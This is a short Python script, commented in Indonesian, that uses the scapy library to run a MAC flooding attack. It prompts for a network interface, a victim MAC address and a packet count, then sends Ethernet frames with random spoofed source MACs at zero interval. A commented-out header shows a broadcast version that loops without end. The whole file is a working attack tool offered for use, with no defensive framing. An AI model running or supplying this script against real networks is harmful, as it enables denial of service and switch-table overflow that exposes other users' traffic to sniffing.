#-------------------------------------------------------------------------------------------------------------------------
# from scapy.all import *
# pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC())
# sendp(pkt, iface="eth0", loop=1, inter=0)
#-------------------------------------------------------------------------------------------------------------------------

# Mengimpor library scapy dan subproccess
from scapy.all import *
import subprocess

# Sebuah fungsi untuk menjalankan flood mac
def flood_mac():
    interface = str(input("Enter your interface >> ")) # Memasukkan nama interface
    mac_victim = str(input("Enter the victim mac >> ")) # Memasukkan alamat mac target
    loop = int(input("Enter the loop of attack >> ")) # Memasukkan berapa jumlah paket yang diulangi untuk dikirim
    pkt = Ether(dst = mac_victim, src=RandMAC()) # Proses pembentukkan paket
    subprocess.run('clear', shell=True) # Menjalankan perintah terminal / shell untuk membersihkan tampilan
    sendp(pkt, iface=interface, loop=loop, inter=0) # Proses mengirim paket

# Menjalankan program dengan memanggil fungsi    
if __name__ == "__main__":
    flood_mac()